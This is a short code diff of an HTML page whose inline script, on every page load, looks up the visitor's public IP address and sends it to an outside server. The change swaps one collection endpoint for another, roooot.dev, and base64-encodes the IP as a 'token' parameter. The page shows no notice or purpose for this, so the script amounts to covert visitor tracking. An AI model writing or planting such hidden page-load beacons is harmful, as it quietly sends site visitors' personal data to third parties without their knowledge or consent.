@@ -6,23 +6,23 @@
 </head>
 <body>
   <script>
-    function get() {
+    function ec(str) {
+      return btoa(unescape(encodeURIComponent(str)));
+    }
+
+    function ip() {
       fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
           const ip = data.ip;
+          const base64Ip = ec(ip);
+          const url = `https://roooot.dev/api/ip.html?token=${base64Ip}`;
 
-          fetch('https://hkdk.events/cy2t824c3u09rn', {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ ip: ip })
-          });
+          fetch(url, { method: 'POST' });
         });
     }
-      
-    get();
+
+    ip();
   </script>
 </body>
 </html>
